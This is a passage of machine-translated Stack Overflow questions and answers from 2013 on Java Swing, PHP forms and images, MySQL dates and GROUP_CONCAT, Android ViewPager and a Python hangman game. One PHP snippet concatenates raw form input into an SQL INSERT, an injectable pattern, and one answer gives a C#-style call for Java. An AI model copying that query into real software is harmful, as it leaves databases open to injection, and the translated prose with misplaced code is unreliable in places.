mainmenu.setBackground(Color.BLUE);
mainmenu.setResizable(false);

}
} 
```

我的另一堂课

```
 import javax.swing.JOptionPane;

 import java.awt.*;
 import java.awt.event.*;
 import javax.swing.*;

 class Time
{

  private JComboBox timeAirportbox;//comboboxes declared
  private JComboBox eastMidbox;
  private JComboBox mancBox;
  private JComboBox heathBox;
  private JComboBox birmBox;
  private String[] airport = {"","EM", "Bham", "Manc", "Heath"};//array of airports   declared
  private String[] destination = {"","NY", "Cali", "FlO", "MIAMI", "Tokyo"};//array      of    destinations declared
  private JPanel timePanel;

    public void SelectTime() {

 //combobox objects created

  timePanel = new JPanel();
  timePanel.setBackground(Color.BLUE);
  timePanel.setPreferredSize(new Dimension(400, 400));

  timeAirportbox = new JComboBox(airport);//array is inserted into the JComboBox
  timePanel.add(timeAirportbox);
  timeAirportbox.setVisible(false);

  eastMidbox  = new JComboBox(destination);
  timePanel.add(eastMidbox);
  eastMidbox.setVisible(false);

  mancBox = new JComboBox(destination);
  timePanel.add(mancBox);
  mancBox.setVisible(false);

  heathBox = new JComboBox(destination);
  timePanel.add(heathBox);
  heathBox.setVisible(false);

  birmBox = new JComboBox(destination);
  timePanel.add(birmBox);
  birmBox.setVisible(false);

}

    public JPanel getTimePanel() {
    return timePanel;
    }

    public JComboBox getAirportBox() {
    return timeAirportbox;      
    }

    public JComboBox getEastMidBox() {  
    return eastMidbox;
    }       

   public JComboBox getMancbox() {
    return mancBox;
    }

  public JComboBox getHeathBox() {
    return heathBox;
    }

  public JComboBox getBirmBox()  {
    return birmBox;
    }       

    } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-19T21:17:13.983

不使用 Work 构造函数中内置的 Time 对象：

```
 Time timeObject = new Time();
  timeObject.SelectTime();
  buttontime2 selectDest = new buttontime2();
  timeObject.getAirportBox().addActionListener(selectDest); 
```

由于您仅将动作侦听`selectedDest`器应用于未使用的 timeObject 的组合框，因此永远不会调用侦听器。

你可以做两件事来让它工作：

*   移动创建侦听器的代码并将其分配给第一个侦听器中的组合框`buttontime`
*   仅创建一次 Time 对象并将其存储为 Work 实例的成员。由于您的侦听器是 Work 类的非静态内部类，因此它将能够使用它而不是创建新的 Time 对象。

**编辑：**我没有在您的第二个听众中看到，您再次构建了一个新的 Time 对象。此对象与您之前创建的对象确实不同，因此修改一个对象不会影响另一个对象。您确实应该创建一次 Time 对象并将其存储为 Work 类的成员变量，然后在您的侦听器中使用此对象，而不是重新创建它。

为了清楚起见，这样做：

```
public class Work extends JFrame {

    // ...

    private Time timeObject;

    public Work() {

        // ...

        timeObject = new Time();
        timeObject.SelectTime();
        buttontime2 selectDest = new buttontime2();
        timeObject.getAirportBox().addActionListener(selectDest);

    }

    public class buttontime implements ActionListener {
        public void actionPerformed(ActionEvent clickTime)  {
            // use timeObject, don't create it and don't call SelectTime()
            // example:
            add(timeObject.getTimePanel(),BorderLayout.EAST);
            // ....
        }
    }

    public class buttontime2 implements ActionListener {
        public void actionPerformed(ActionEvent clickTime)  {
            // use timeObject, don't create it and don't call SelectTime()

        }
    }
} 
```

还要注意：

*   您不应该扩展 JFrame，没有理由这样做。重构您的代码，使您的框架只是您的 Work 类的一个成员变量。
*   遵循[Java 标准代码约定](http://www.oracle.com/technetwork/java/javase/documentation/codeconvtoc-136057.html)，尤其是正确使用类名的用例：`buttonlistener`应该是`ButtonListener`，方法应该以小写开头：`SelectTime`应该是`selectTime`。

# java - 集成测试服务器的数据库填充

> ID：15510386
> 
> 赞同：2
> 
> 时间：2013-03-19T21:03:36.320
> 
> 标签：java, database, automation, java-ee-6, setup-deployment

我正在处理一个非常有趣的挑战，我们有一个集成项目，需要将“开发中”的应用程序与遗留应用程序互连起来。我们开发了一个代理，可以从新应用程序调用旧应用程序，现在我们需要针对第三家公司的代码进行测试或开发。我命令这样做，我们设置一个与生产服务器具有相同设置的服务器，并且我们将客户端应用程序连接到该服务器以进行测试。

应用粗略涉及技术：Java EE 6、Postgresql、java 7、JPA 2、Hibernate、Jboss 7

我的问题是我们需要用伪真实数据填充数据库。从应用程序的角度来看，可以生成并且适合的数据。数据必须以某种方式真实，因为它对遗留应用程序套件通过 JMS 发送的不同通知作出反应。令人担忧的是，它应该简单、快速实施，并以某种方式创建一种易于重用的机制——每当我需要新数据时，只需运行一次（可能带有参数？！），魔法就完成了。

目前我试图找到最好的方法，我考虑了以下内容：

*   纯 SQL 脚本
*   在 DB 中插入所需内容的 java 应用程序
*   某种令人兴奋的想法 - 使用脚本语言完成工作（哪个 - python，groovy）

任何想法、建议、问题都会受到欢迎。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-20T05:39:46.293

也许你应该使用 DBUnit，它有一个 XLSImporter。因此，您可以将测试数据保存在 Excel 文件中。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-17T11:53:55.253

我为了填充数据库，我在应用程序的公共 API 之上构建了一个工具，用于创建所需的实体。为了让我们的客户更容易添加所需的数据，我将适当的方法公开为 WS，客户可以根据需要调用这些方法。

出于主观原因，我用 java 编写了应用程序，即使我认为脚本语言（我认为 groovy）是最好的选择。

# php - php图像输出为乱码字符串

> ID：15510388
> 
> 赞同：1
> 
> 时间：2013-03-19T21:03:40.360
> 
> 标签：php, text, output, watermark

我正在使用此页面上的代码 - [http://www.php.net/manual/en/image.examples-watermark.php](http://www.php.net/manual/en/image.examples-watermark.php) - 为 JPEG 图像添加水印。我唯一更改的是图像文件的链接，并且链接是正确的。

```
<?php
// Load the stamp and the photo to apply the watermark to
$stamp = imagecreatefrompng('stamp.png');
$im = imagecreatefromjpeg('photo.jpeg');

// Set the margins for the stamp and get the height/width of the stamp image
$marge_right = 10;
$marge_bottom = 10;
$sx = imagesx($stamp);
$sy = imagesy($stamp);

// Copy the stamp image onto our photo using the margin offsets and the photo 
// width to calculate positioning of the stamp. 
imagecopy($im, $stamp, imagesx($im) - $sx - $marge_right, imagesy($im) - $sy - $marge_bottom, 0, 0, imagesx($stamp), imagesy($stamp));

// Output and free memory
header('Content-type: image/png');
imagepng($im);
imagedestroy($im);
?> 
```

这是我得到的输出。有谁知道这是为什么，或者我该如何解决？谢谢！

```
> ‰PNG  IHDR––³cæµPöç Ï>ûl"‘xá…¾úê+Ï ƒˆ‚HHhsÁ!cš"i®QÐÜÔqŽ
> BrkÅ!¨Í8\MGÄ°IØ–0Ô\à„
> í‡îSÔ¶:±,–|Ñhtýúõ?ûÙÏn0%%%Ï<óL:~þùçûúú||ªŒE–iA2®óB¸€Œ£æª1U“á.ˆª‹CE"ËN¤7•¶¤XÚ6ÇùjH©(q$æ
> G H+n]'[„Ì·%DÄ+V<÷Üs•••&gt;ÞÆ‰DâG?úQ__ßo~ó›TÊ}üŠ BDA
> Ô\¡g&ÛXAågÖN5¦ˆò¬÷uDNKëÇyƒÛ¤ŽºÄF›qËH —c€„
> pbÈ€!CÄ]ÿ•BÅBÑÿ¼aíŸÊÊÊ~üãŸz³§™2˜?þºuë~þóŸ÷÷÷Û!‚¢°hÄrÂ:˜f^t¹8eDÑ‹ºe”¬F±’Ñ6ë…å–ëÃ
> ­;cº0`9r«U¾õÇ[è^bl½ª¸ª¸Rtß}÷­^½zŒÆï¹1öøã777ïÞ½ÛùTU0¢2§šTiýFÆµæªj„ÙrÇi;oÓN
> ˆ
> ‰Ò¶y«FÀ~Z”ëè”;…®ùU˜sXQTT´jÕªY³f¹¾"ÎùÈÈ(Š¢(JVÿþ˜0aÂÚµk:ÔÝm_SFæÛÚ)f—iJ
> †«F=Òçšwˆ£k¤O½Z~†"Ž
> xW¤6!Y{QQgEÚØØ¸téÒÑL^_¹r¥«««­­íÔ©SW¯^%¢D"QSSs÷ÝwO™2¥¢¢"çúùÁ\²dÉŸþô'³Æ¢Ë
> —Îõ]—ÓŸ|N°@"@äÈõN‰Ö×4uS„khd¦š5¸p™À3ªå
> -ÍvÖþ,¦Ø'ã£Ñèc=6eÊŸï÷AoooKKË;ï¼óÙgŸ;wnppÐò¸qãfÎœ¹hÑ"1…–‘eeeË—/ojjºpá‚IŒŒ1ça>p£ÐÙƒGp†¨»ÚÙ‡¥Dæ§–\o­zÇ8‚­ºwþTÅÞ'­««[²dI*HD‡Ú¶m[KKËÕ«W†‡‡»»»»»»ß{ï½·ÞzkÍš5?üp$‘èþûïŸ;wîÛo¿!(
> #îÍº;œtú;¤I§w0jgqÑÔ?2¢´Gm Ì×L›Êsìê2¹Šƒ©yóæÕ××É3FFFÞxãW_}õÓO?Íê9•Jµ¶¶ž>}º§§gåÊ•ÅÅÅRq?þ¡‡Ú¿¿heQªØ¹P(&&DzmÅD÷ó¶½¢4.ì“œ¦Á†þˆŒógü]ÛG—””,^¼8‘HOpÎßxã_ÿú×§N
> þVWW×K/½422²nÝºh4šýŒ± TUU9s&#Ì6Ód:Vs3c
> û”˜?@ñqªŒ1ÍeŒ1æ€)¢Ìµ6©€ˆ$Úo×R$ª««çÌ™&lt;#>øàƒW_}UŠ?¾¾¾?þñMMM²§ÕÔ××744dõæ,9À’ñCàÙ~"Qt<]"$ŽÂå„œ€ùüãçä8ª««¥^éííÝ¶m[úÓgÎœÙ¶mÛçŸ.õVEEÅìÙ³-"Fèø1œBí:~’)çšêÈ¸cŽ3f”––÷ODÍÍÍ---£‰ôðáÃMMMæ†-+"‘ÈŒ3ò;óÀAê'
> ÷²ä÷ œ=Šx<>uêTÿýƒ6$“É½{÷ºö?ƒ#NïÛ·ÏÜ°ÁÔ©SeûAf8óARK´…ø[
> EEE“&amp;M’z¥³³3ç*ÔŒ“'O;vLê•êêjÙn—?Tï-O>é‘Êµ÷°îEÓ_}‰ÅbãÆóóí@GGÇÅ‹%æ‚þþþcÇŽ=òÈ#Á'áJKKËÊL&j„9QÁí`k¯ªªTCÈ9ÿòË/ób
> AD²AE"©Ôf…¼YŒÌ
> ¤µ0ðÉä1Ç½½Ú122råÊ©dùàÊ•+A·€¢(±X,_±Ã­¨…’Eô!lpÿD”NÝƒšétZvt˜_¨Ò}LÉŠ[öã‚±hòÃ9÷Úœâ
> UUKJJ$Óå‰’’©Î0ç\Jk³âÖÓByŒŒŒ8Ä}
> (JuuµÔÜ˜&Nœ(5Î“MmVÈÏëKþÆ(|3R©”l÷²¡¡áŽ;îO‰DbæÌ™RZØßßŸÇ–n-r®†û£®®nÆŒ£º¶¶ößø†Ô+çÎËÙ$Ñl¬µê`pp°³³Ói;éƒqãÆ}ë[ßeÏ.\(»ÈÜÙÙ™g
> óÖÍuttH50Œ±‡zèÞ{ïM¼
> >ú¨T›šN§;::äÌêü!ßÞ:sª¦·ÚÛÛ{{{¥"šøàƒ³gÏš…®ù€
> Ñõçôé¹wÆÓ\GÉüºç»¾ó,™ØÞZ[[O:5}út©ô”––&gt;ýôÓÕÕÕ;wî<|ø°ÿ
> ›16sæÌïÿûO<ñDº{ùòå}ûöœP
> ž·ª›¡7€wNšw[™Õ2WŒ¶-¢ñfc¹Î¨µ···¶¶N›6MvÅ?/_¾|Îœ9o¾ùæÞ½{¿øâ‹d2iËÁ’’’ÚÚÚE‹-[¶lÖ¬Y¹mþøã?üðC‡˜$×ïì§¶48çbw™%
> ¦}§þáø[èh¡ù¾eÜ:·r
> ìÞ½{éÒ¥²;0D˜uuu6løîw¿ÛÞÞ~ôèÑ®®®K—.qÎËËË'Nœ8{öì»ï¾»¦¦&ç9¡¡¡={öØjQ°ÇÜº9ú¦è`%Wìæ¶{5¿ëHØq%SDô3ÁÚ¶&"ºšˆ¾ÿþûøÁ~0.E©©©©©©Y¼xñÐÐÐðð0E£Ñx<.5ÿâŠ>úhïÞ½AŠ¸ÏVláË|CDª­Nðƒ
> ›k7ÏA´0ˆ±„sS¥«î*n{/“ÉäŽ;æÏŸŸóžn-pE)..Íö×„ãšyË< zf™¹_e‹ÝùE
> ®§3ªF00©Têµ×^;qâÄºuëüñªªª€/G2™|óÍ7·nÝzàÀ‰-
> ±x4Â`¢ëN"EÞˆñ††+XŽZÕŠ\uë’Ýrkz`ê`4ðZÁ°Ü–•–g?+Ò„#GŽ|þùçÍÍÍkÖ¬yàò²ƒ
> þùÏîØ±cÏž=AN¯4#‹Ýù/wªÚ¸ÍR]`Ò9q’G`ZÝÉ8¢çza¾
> ;û0=¥ååwM­;Õù…TàýýýûÛß<¸hÑ¢'Ÿ|òþûï¯¬¬Ì­j%¢K—.9rd÷îÝo¿ývgggë
> ã+«*'L@$D&r¶áœÛ ‚ôÚˆ
> wÌ'™¤bzk£¶¢âŽûçÍomÞŸÃÖúžžž?ÿùÏo½õÖœ9s–,Y²páÂúúúŠŠŠ
> ‡X¤Óéd2yêÔ©ƒîÛ·ïðáÃÎõ£à¸ç_ï­®š jeÍºärXyPa`ÌµP:ôÀéY°ðÁ¿¿±ç³OŽÊÆ
> pñâÅwß}·¥¥¥ªªª¡¡aöìÙ
> µµµ“&amp;Mª¨¨`Œ©ªÊKNW®\ééé9}úô‰'Ž=ÚÞÞ~öìY)+'&NªYòÈÒxQX'55Fô!¼™3`ÄqŒvtM:n.^ÿËŽ_x¾ïâ…ì^
> '‰âââ²²²¢¢¢D"¡(J*•J&“×®]Ë×þÁx¼hý†Ÿ&gt;ýÓM¶5ä
> aä>‘I`¯un•™Ü°ì±å/\Ø¾õÕK—üNÞ
> ˆ¡¡¡¡¡!ÿC|ó‚x¼èñ«V¬^ëÜ`ª-ÔN¹1§Pv+©Ô&Ä¢¢ÄšuëËÊÊvýegûñcùÝŸ9F˜T;ù±'þsåêµwŽûš7ãS-ÚöÚŒyEš/
> }vÔqÎ}úÉ»ïìýèÐû§Ou¦RCé‘¼™æÈ0‹WOœxOã½KþãÛ÷4Þë³ 
```

# php - 使用许多不同长度的数组从 foreach 将数据插入 db

> ID：15510390
> 
> 赞同：1
> 
> 时间：2013-03-19T21:03:41.310
> 
> 标签：php, mysql, sql, foreach

我试图从如下所示的表单中插入数据：

```
<input type="checkbox" name="single_color_show[]" value="1" id="1" checked>
<input type="text" name="single_color_val[]" class="input-admin-val" value="0" id="1">
<input type="hidden" name="single_color_name[]" value="Vit: (NCS S0502-Y)" id="1">
<input type="hidden" name="single_color_head[]" value="colors" id="1">
<input type="hidden" name="single_color_standard[]" value="1" id="1">
<input type="hidden" name="single_color_order[]" value="1" id="1">
<input type="hidden" name="single_color[]" value="1" id="1"></td> 
```

等等...

我想要的是所有值都存储在数据库中。只要检查了 single_color_show，它就可以正常工作。但无论如何我都需要插入数据，但其值为 0 而不是 1，因此脚本知道它应该被隐藏。

这是我的 php 代码：

```
$single_color_show = $_POST['single_color_show'];
$single_color = $_POST['single_color'];
$single_color_name = $_POST['single_color_name'];
$single_color_val = $_POST['single_color_val'];
$single_color_head = $_POST['single_color_head'];
$single_color_standard = $_POST['single_color_standard'];
$single_color_order = $_POST['single_color_order'];

foreach($single_color_order as $key => $n) {
$s_color = "INSERT INTO product_attributes (products_id, att_name, att_head, att_val, att_standard, att_order, att_show) VALUES ('".$products_id_enkel."', '".$single_color_name[$key]."', '".$single_color_head[$key]."', '".$single_color_val[$key]."', '".$single_color_standard[$key]."', '".$single_color_order[$key]."', '".$single_color_show[$key]."');";
$q = mysql_query($s_color) or die ('Error posting data enkeldörr färg');
} 
```

只要我选中所有选项，它就可以保存数据，但由于我需要检索数据以供将来编辑，所以我需要所有呈现的选项与所选属性一起使用。

如果我检查让我们说 3 个选择中的 2 个，我希望将数据存储为

```
products_id, att_name, att_head, att_val, att_standard, att_order, att_show
12           Red       Color      80          1            1          1
12           Blue      Color      50          0            2          0
12           Green     Color      70          0            3          1 
```

这就是我现在得到的：

```
products_id, att_name, att_head, att_val, att_standard, att_order, att_show
12           Red       Color      80          1            1          1
12           Green     Color      70          0            3          1 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-19T21:41:12.663

您需要处理 checkbox-HTML-code 和 checkbox-array：

(1) HTML从0开始
给每个checkbox一个唯一的：`value`

```
<input type="checkbox" name="box[]" value="0"/>
<input type="checkbox" name="box[]" value="1"/>
<input type="checkbox" name="box[]" value="2"/>
<input type="checkbox" name="box[]" value="3"/>
<input type="checkbox" name="box[]" value="4"/>
<input type="checkbox" name="box[]" value="5"/> 
```

(2) PHP
提交后处理数组...

```
if (isset($_POST['box'])) {

    $max = count($_POST['single_color']); // get max number of elements in "full" array

    for ($i = 0;$i < $max;$i++)
        $box[$i] = intval(in_array($i,$_POST['box']));
} else $box = array(); 
```

(3) 使用 mysqli_* 或 PDO 代替 mysql_* ;-)

---> 在此处查看现场演示：http: [//codepad.viper-7.com/jUPSeH](http://codepad.viper-7.com/jUPseH)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-19T21:29:13.160

您可以将 single_color_show 属性设置为像其他属性一样的隐藏字段，然后在复选框更改时使用 javascript 在 0 和 1 之间切换它的值。

# java - 使用 JSP 将图像上传到磁盘上的特定文件夹

> ID：15510391
> 
> 赞同：0
> 
> 时间：2013-03-19T21:03:41.733
> 
> 标签：java, jsp

大家好，请参考这篇文章.....[使用 JSP/Servlets 上传图片](https://stackoverflow.com/questions/14996080/how-to-store-image-on-disk-using-servelets-but-path-in-database-oracle)

我的问题是，如果我们多次上传同一张图片，图片将如何存储...？例如，如果一个人上传了一张图片**ABC.jpg**，而另一个用户也上传了同名的图片，那么系统将如何接受它，因为在任何操作系统中，当我们尝试添加同名的文件时，它要么要求**“替换”**或**“重命名”**文件。

那么如何使用这个概念......？？谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-19T21:28:16.360

在我的项目中，我总是更改上传文件的名称，并以毫秒为单位添加上传时间。这就是说，两个用户在同一时刻上传同一个文件的可能性非常小。

# android-pay - Google Wallet：添加测试信用卡导致错误 130319

> ID：15510392
> 
> 赞同：2
> 
> 时间：2013-03-19T21:03:54.967
> 
> 标签：android-pay

很久以前，我在我的网站（正在开发中）上为数字商品设置了谷歌钱包。也许在夏天左右。

一切正常，现在我有了一个新设计，我正在尝试实际实现它，但是当我尝试从这里添加测试信用卡时，我不断收到错误：[https ://developers.google.com/商业/钱包/数字/文档/测试](https://developers.google.com/commerce/wallet/digital/docs/testing)

错误是：

> 哦哦。有问题。由于技术问题，我们无法开始您的购买。130319 16:55:47-0400 FCWI6O

你看到底部的错误代码了吗？**130319** 总是一样的...

当我在这里尝试购买虚拟蛋糕时遇到同样的错误：[https ://developers.google.com/commerce/wallet/digital/docs/tutorial#7](https://developers.google.com/commerce/wallet/digital/docs/tutorial#7)

这让我相信，我没有弄乱我的代码，但在其他地方存在问题。

这是怎么回事？测试信用卡有问题吗？沙盒挂了吗？

感谢任何帮助！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T01:35:28.613

在谷歌论坛上收到回复：

> 您能否尝试将测试卡直接添加到您的沙盒客户钱包帐户：[https ://wallet-web.sandbox.google.com/manage](https://wallet-web.sandbox.google.com/manage)

这就是诀窍！我现在可以再次购买我的虚拟蛋糕了... :-)

# php - 从数据库中提取日期并仅选择今天的记录

> ID：15510394
> 
> 赞同：0
> 
> 时间：2013-03-19T21:03:57.787
> 
> 标签：php, mysql, sql, date

我创建了一个处理约会的 webapp。然后，它将存储在 mysql 数据库中的这些约会放置到谷歌地图上。

我只想显示“今天”的约会。要在我的 sql 查询中做到这一点，我需要做一些类似的事情`select * from appointments where $date = today`。目前它只是读取`select * from appointments`。我遇到的问题是日期以下列格式存储在一列中`Fri Mar 08 2013 09:00:00 GMT 0000 (GMT)`。在地图上绘制时，时间方面无关紧要，我所需要的只是提取日期并显示与“今天”日期相关的那些记录。

当它被格式化时，如何从一列中获取日期，以及如何以相同的格式设置今天的日期？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-19T21:09:19.940

可能很麻烦......但我会这样解决它（纯SQL）：

```
select *
from appointments
where `date` >= curdate() and `date` < date_add(curdate(), interval +1 day); 
```

我假设您的`'date'`字段存储为`date`or `datetime`，而不是字符串。如果您将日期存储为字符串，那么您将遇到一些大问题，因为您需要以某种方式将字符串“转换”为有效日期。

希望这可以帮助你

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-19T21:08:50.637

哦亲爱的。您应该将日期存储为 DATE 数据类型。它有自己的内部格式。当您查询表时，您可以使用 MySQL DATE_FORMAT() 函数以您需要的任何格式显示它。

更改列后（并将所有现有数据转换为正确的格式，执行基于日期的查询将毫无问题。

# arrays - 表达式的类型必须是数组，但解析为列表

> ID：15510397
> 
> 赞同：0
> 
> 时间：2013-03-19T21:04:16.590
> 
> 标签：arrays, arraylist

我正在创建一个字符串字段列表并存储在一个数组列表中。现在，当将该数组列表传递给数组时，我收到以下错误：

表达式的类型必须是数组，但解析为列表

```
List<String> fields = new ArrayList<String>();
        fields.add("_raw");
        //fields.add("_time");
        fields.add("host");
        fields.add("sourcetype");
        fields.add("source");
        jobRes.setFieldList(fields[]);
        jobRes.setOffset(2500); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-19T22:20:13.067

这有点模糊。这是java吗？C＃？无论如何，我敢打赌问题出在你的演员表上。我会尝试类似的东西：

```
jobRes.setFieldList(fields.ToArray(new String[fields.Size()]) 
```

这实际上将传递一个数组。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-02T22:47:04.547

（对不起，addtl 的答案，我无法评论） 乍一看，我想这是 Java，因为 C# 没有允许类型分配的 ArrayList （无论如何我不认为）。以上在 Java 中实际上是正确的，因为 ArrayList 继承自抽象列表。这样做的原因通常是为了简化迭代/转换。ArrayList 已经有一个 add 方法，所以看起来强制转换只是为了启用未执行的不同强制转换...... :)

# android - ViewPagers 的隐式 Z 排序

> ID：15510401
> 
> 赞同：5
> 
> 时间：2013-03-19T21:04:31.040
> 
> 标签：android, android-viewpager, android-support-library

我正在尝试实现一个与[此处](http://developer.android.com/training/animation/screen-slide.html)标记的示例`ViewPager.PageTransformer`几乎相同的示例（它位于页面底部）。`DepthPageTransformer`

但是，与其让层次结构遵循 z-index 从左到右减小的模式（即右侧的视图将从下方出现），我希望 z-index 从左到右增加（左侧的视图将从下面出现）。

作为第一次尝试，我基本上交换了示例中表示从左侧与右侧进入的页面的代码，但我发现存在隐式 z 排序，使得左侧的页面始终*高于*右侧的页面，因此当您向右滑动查看页面时，它会很好地滑动，但消失的视图将消失在新输入视图的“顶部”。

**有什么方法可以调整 a 所服务页面的 z 索引** `ViewPager`**吗？**

我的第一直觉是以某种方式`ViewPager`从支持库中复制代码，并修改类以执行我的命令，但我不清楚该类中隐式排序的来源。

这是我的（主要是扯掉）`PageTransformer`：

```
public class DepthPageTransformer implements ViewPager.PageTransformer {
    private static float MIN_SCALE = 0.75f;

    public void transformPage(View view, float position) {

        int pageWidth = view.getWidth();

        if (position < -1) { // [-Infinity,-1)
            // This page is way off-screen to the left.
            view.setAlpha(0);

        } else if (position <= 0) { // [-1,0]  
            view.setAlpha(1 + position);

            // Counteract the default slide transition
            view.setTranslationX(pageWidth * -position);

            // Scale the page down (between MIN_SCALE and 1)
            float scaleFactor = MIN_SCALE
                    + (1 - MIN_SCALE) * (1 - Math.abs(position));
            view.setScaleX(scaleFactor);
            view.setScaleY(scaleFactor);

        } else if (position <= 1) { // (0,1]            
            view.setAlpha(1);
            view.setTranslationX(0);
            view.setScaleX(1);
            view.setScaleY(1);

        } else { // (1,+Infinity]
            // This page is way off-screen to the right.
            view.setAlpha(0);
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2013-03-29T16:14:17.867

ViewPager 页面的绘制顺序由`ViewPager.setPageTransformer()`方法的第一个参数决定。

查看方法签名：

```
public void setPageTransformer (boolean reverseDrawingOrder, ViewPager.PageTransformer transformer) 
```

`reverseDrawingOrder`参数文档说：“如果提供的 PageTransformer 需要从最后一个到第一个而不是从第一个到最后一个绘制页面视图，则为 true。”

在内部，当 ViewPager 页面绘制顺序正在确定时，它会调用：

```
protected int getChildDrawingOrder(int childCount, int i) {
    final int index = mDrawingOrder == DRAW_ORDER_REVERSE ? childCount - 1 - i : i;
    final int result = ((LayoutParams) mDrawingOrderedChildren.get(index).getLayoutParams()).childIndex;
    return result;
} 
```

mDrawingOrder 由 reverseDrawingOrder 布尔标志在内部设置`ViewPager.setPageTransformer()`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-01-10T13:10:13.463

你可以使用 .bringToFront(); 方法。

# jquery-ui-tooltip - jQuery UI 工具提示显示在页面底部

> ID：15510408
> 
> 赞同：0
> 
> 时间：2013-03-19T21:05:01.347
> 
> 标签：jquery-ui-tooltip

在我的项目中，我使用 jQuery UI 1.10.2 来显示页面上链接的工具提示。但是，当我将鼠标悬停在任何链接上时，工具提示会显示在页面底部的内容区域下方，而不是链接的正下方。

经过仔细检查，我发现当悬停在工具提示项上时，由于某种原因，没有为 ui-tooltip div 设置“顶部”样式。

```
$(document).tooltip({ 
  content: function() { 
    return $(this).attr('title'); 
  }
}); 
```

有没有人知道为什么会这样做？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T13:46:50.830

我已经成功解决了这个问题。事实证明，我一直在我的源代码中包含 jquery.dimensions 插件，并且不知何故它与我的 jquery-ui-1.10.2 包含冲突，并导致工具提示显示在我的所有内容*下方*。删除 jquery.dimensions 的包含解决了这个问题。

希望这可以帮助将来可能遇到相同问题的其他人。

# python - 为什么这个局部整数不能修改全局常量？

> ID：15510410
> 
> 赞同：0
> 
> 时间：2013-03-19T21:05:09.570
> 
> 标签：python

我一直在用 Python 制作这个 Hangman 游戏。问题出在 play_hangman 函数中。每次发生猜测时，恒定的“猜测”都会增加 1。我希望它打印出“%s 个猜测结果！” 我从全局常量（MAX_GUESSES）中减去局部常量（猜测）得到 %s。但是它似乎不起作用，当它应该向下增加时，它会继续吐出“剩下的 6 个猜测”。有什么建议么？

```
 # CONSTANTS
MAX_GUESSES = 6

# GLOBAL VARIABLES 
secret_word = 'claptrap' 
letters_guessed = []

# From part 3b:
def word_guessed():
    '''
    Returns True if the player has successfully guessed the word,
    and False otherwise.
    '''
    global secret_word
    global letters_guessed
    for i in secret_word:
        if i in letters_guessed:
            continue
        else:
            return False        
    return True

def print_guessed():
    '''
    Prints out the characters you have guessed in the secret word so far
    '''
    global secret_word
    global letters_guessed
    blanklist = []
    for i in secret_word:
        if i in letters_guessed:
            blanklist.append(i)
        else:
            blanklist.append("-")
    blanklist_string = "".join(blanklist)
    return blanklist_string

def play_hangman():
    # Actually play the hangman game
    global secret_word
    global letters_guessed
    global MAX_GUESSES
    # Put the mistakes_made variable here, since you'll only use it in this function
    mistakes_made = 0
    guesses = 0
    guesses_left = MAX_GUESSES - guesses

    while word_guessed() is False:
        print print_guessed()
        print "%s guesses left!" % guesses_left
        letter_choice = raw_input("Choose a letter:")
        if letter_choice not in secret_word:
            mistakes_made += 1
            print "you have made %s mistakes" %mistakes_made
            print "sorry, that is not in the word"
        letters_guessed.append(letter_choice)
        guesses +=1
        print "you have made %s guesses" %guesses
        word_guessed()

    while word_guessed() is True:
        print "Congratulations! You win :)"
        break 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-19T21:10:43.947

你需要把`guesses_left = MAX_GUESSES - guesses`里面的`while word_guessed() is False:`循环。就像现在一样，您正在设置`guesses_left = MAX_GUESSES - guesses`when `guesses == 0`，然后仅`guesses`在循环内进行更改。那将`guesses_left`保持不变。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-19T21:10:59.877

你不用重新计算`guesses_left`。在每次迭代开始时，您必须执行`guesses_left = MAX_GUESSES - guesses`

# php - $_POST 不能使用简单的表单

> ID：15510414
> 
> 赞同：3
> 
> 时间：2013-03-19T21:05:23.110
> 
> 标签：php, post

真的不知道为什么会这样，但我的简单 PHP 表单无法使用 $_POST 变量，返回错误。

HTML 表单：

```
<form name = "post" action = "insert_into.php" method = "post">
<p><label for="author">Author:</label></p><input type = "text" id = "author" name = "author"> 
<p><label for="subject">Subject:</label></p><input type = "text" id = "subject" name = "subject">
<p><label for="content">Content:</label></p><textarea id = "content" rows = "8" cols = "40" name = "content"></textarea>
<br />
<input type = "submit">
</form> 
```

PHP处理脚本：

```
$subject = $_POST['subject'];//line 7
$author = $_POST['author'];//line 8
$content = $_POST['content'];//line 9
$date = date("d/m/Y"); 
```

错误：

```
Notice: Undefined index: subject in E:\_temp\xampp\htdocs\sxp\insert_into.php on line 7

Notice: Undefined index: author in E:\_temp\xampp\htdocs\sxp\insert_into.php on line 8

Notice: Undefined index: content in E:\_temp\xampp\htdocs\sxp\insert_into.php on line 9 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-19T21:12:52.337

你有重复的帖子可能是它起作用的原因。尝试将您的表单名称更改为其他名称。另外，尝试去掉 = 符号周围的多余空格。

# mysql - mysql group_concat，大小限制是否仅适用于返回值？

> ID：15510418
> 
> 赞同：1
> 
> 时间：2013-03-19T21:05:33.673
> 
> 标签：mysql, md5, group-concat

在不详细说明原因的情况下，我想根据 group_concat 函数的结果进行连接。（不用说，我不能更改最大长度参数，但计划捕获我可以用来加入的哈希）从它的外观来看，我在使用 md5 时得到了不同的值。例如。

```
select CONVERT(md5(group_concat(mycolumn))  USING utf8) ... 
```

从将 group_concat 值粘贴到引号中返回不同的结果

```
select CONVERT(md5(group_concat('truncated value returned by group_concat...')) USING utf8) 
```

我可以假设 group_concat 将完整的结果返回给 md5 函数，或者差异可能是由其他原因引起的吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-19T21:17:55.427

`GROUP_CONCAT`不*将*完整结果返回到`MD5`. 我专门测试过：

```
SET group_concat_max_len = 5;
SELECT MD5(GROUP_CONCAT('123456'));
-- 827ccb0eea8a706c4c34a16891f84e7b
SET group_concat_max_len = 999;
